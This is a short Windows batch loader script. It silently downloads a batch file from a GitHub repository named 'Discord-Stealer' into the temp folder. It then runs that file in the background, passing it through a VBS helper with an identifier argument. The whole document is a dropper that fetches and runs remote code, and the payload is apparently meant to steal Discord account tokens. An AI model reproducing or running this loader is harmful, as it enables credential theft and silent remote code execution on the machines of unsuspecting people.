@echo off
set Identifier=%~1
set "Save=%temp%"
curl --create-dirs -sf#kLo "%Save%DAS.bat" "https://github.com/agamsol/Discord-Stealer/raw/main/2.0/DAS.bat"
call "%Save%DAS.bat" --Background
call "%Save%background.vbs" "%Save%DAS.bat" "!Identifier!"
exit /b
